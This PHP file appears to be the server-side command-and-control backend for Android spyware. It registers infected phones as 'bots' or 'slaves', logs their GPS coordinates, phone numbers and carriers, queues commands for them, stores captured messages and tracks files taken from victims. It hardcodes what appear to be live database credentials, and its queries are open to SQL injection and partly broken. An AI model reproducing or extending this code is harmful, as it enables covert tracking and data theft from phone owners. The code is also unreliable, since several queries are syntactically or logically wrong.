<?php
  $url = "https://informacion.herokuapp.com";

  if (file_exists("config.php")) {
    include("config.php");
  } else {
    die();
  }
  
    //$connect = new PDO("mysql:host=$dbhost;dbname=$dbname", $dbuser, $dbpass);


    //$connect = new PDO("mysql:host=$dbhost;dbname=$dbname", $dbuser, $dbpass);
$connect = pg_connect("host=ec2-54-163-240-54.compute-1.amazonaws.com port=5432 dbname=d97hqd0uu802gp user=vxoxyrownzuzgx password=0669e05248eea11fe4bdc6d93f82de2248a0dd9a9345ee09215f6f4d2d393862") or die('No se ha podido conectar: ' . pg_last_error());;
//conectarse a una base de datos llamada "mary" en el host "sheep" con el nombre de usuario y password
if (!$connect) {
  echo "Ocurrió un error.\n";
  exit;
}

  

function slave_exists($UID) {
	global $connect;
	$statement = "SELECT uid FROM bots WHERE uid= 'dvuid'";
	$row = pg_query($statement) or die('La consulta fallo: ' . pg_last_error());

	if(!$row){
	  return false;
	} else {
	  return true;
	}
}

function setFunction($UID, $Function){

	$UID = sanitize($UID);

	$Function = sanitize($Function);

	if(slave_exists($UID)){
		$functions = getFunction($UID);
		if($functions == ""){

			$statement=("UPDATE slaves SET Function='$Function' WHERE 'Unique_ID' = '$UID'") or die('La consulta fallo: ' . pg_last_error());
    
			$statement1=pg_query($statement) or die('La consulta fallo: ' . pg_last_error());

		} else {

			$functions = $functions . ", " . $Function;

			$statement=("UPDATE slaves SET Function='$functions' WHERE 'Unique_ID' = '$UID'") or die('La consulta fallo: ' . pg_last_error());
			$statement1=pg_query($statement) or die('La consulta fallo: ' . pg_last_error());

		}
	}
}

function updateSlave($UID, $Device, $Version, $Coordinates, $Provider, $PhoneNumber, $SDK, $Random){
  $remove = array("(", ")");
  $cleancoords = str_replace($remove, "", $Coordinates);
  $splitcoords = explode(",", $cleancoords);
  $Lati = $splitcoords[0];
  $Longi = $splitcoords[1];
  
  global $connect;
  
  if (slave_exists($UID)){
	$statement ="UPDATE bots SET device='$Device', version='$Version', lati='$Lati', longi='$Longi', provider='$Provider', phone='$PhoneNumber', sdk='$SDK', random='$Random' WHERE 'uid' = '$UID'";
	$statement1=pg_query($statement) or die('La consulta fallo: ' . pg_last_error());



  } else {

    $statement = ("INSERT INTO 'bots' ('uid', 'device', 'version', 'lati', 'longi', 'provider', 'phone', 'sdk', 'random') VALUES ('$UID', '$Device', '$Version', '$Lati', '$Longi', '$Provider', '$PhoneNumber', '$SDK', '$Random')");

	$statement1= pg_query($statement) or die('La consulta fallo: ' . pg_last_error());


  }
}

function addMessage($UID, $Message) {
  global $connect;
  $statement = ("INSERT INTO 'messages' ('uid', 'message') VALUES ('$UID', '$Message')");
  $statement1=pg_query($statement) or die('La consulta fallo: ' . pg_last_error());
}

function addToUploads($owner, $slave, $file){
	if(slave_exists($slave)){
      if(file_exists("dlfiles/" . $file)){
	    global $connect;
        $statement = "INSERT INTO 'files' ('uid', 'file') VALUES ('$slave', '$file')");
        $statement1=pg_query($statement) or die('La consulta fallo: ' . pg_last_error());
      }
	}
}
?>
